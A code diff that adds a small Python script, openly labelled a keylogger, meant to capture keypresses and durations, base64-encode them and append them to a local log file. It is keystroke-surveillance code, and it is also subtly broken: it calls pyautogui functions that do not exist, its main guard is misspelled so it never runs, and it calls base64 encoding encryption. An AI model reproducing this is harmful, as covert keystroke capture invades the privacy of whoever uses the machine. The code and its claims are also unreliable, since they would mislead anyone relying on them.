@@ -1,0 +1,26 @@
+import pyautogui
+import time
+import base64
+
+def keylogger():
+    with open("keylog.txt", "a") as f:
+        while True:
+            # When a key is pressed on the keyboard
+            if pyautogui.is_pressed("enter"):
+                # Record the key code and the duration it was pressed
+                key_code = pyautogui.get_current_key()
+                key_duration = time.time() - start_time
+
+                # Encrypt the recorded data
+                cipher = base64.b64encode(f"{key_code} {key_duration}".encode("utf-8"))
+
+                # Write the encrypted data to a file
+                f.write(cipher.decode("utf-8") + "\n")
+
+            # Press Ctrl+C keys to exit the loop
+            if pyautogui.is_pressed("ctrl") and pyautogui.is_pressed("c"):
+                break
+
+if __name__ == "__main":
+    start_time = time.time()
+    keylogger()
